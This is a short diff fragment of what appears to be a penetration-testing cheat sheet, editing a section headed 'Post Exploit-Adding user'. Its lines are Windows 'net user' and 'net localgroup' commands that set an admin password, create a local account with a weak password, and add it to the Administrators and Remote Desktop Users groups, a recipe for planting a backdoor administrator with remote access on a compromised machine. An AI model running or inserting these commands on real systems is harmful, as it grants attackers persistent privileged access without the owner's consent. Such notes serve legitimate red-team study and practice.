@@ -15,6 +15,6 @@ net user admin Ev!lpass
 
 
 #Post Exploit-Adding user
-net user test testtest /add
-net localgroup administrators ceger /add
-net localgroup "Remote Desktop Users" test /add
+net user test-user testtest /add
+net localgroup administrators /add test-user
+net localgroup "Remote Desktop Users" /add test-user 
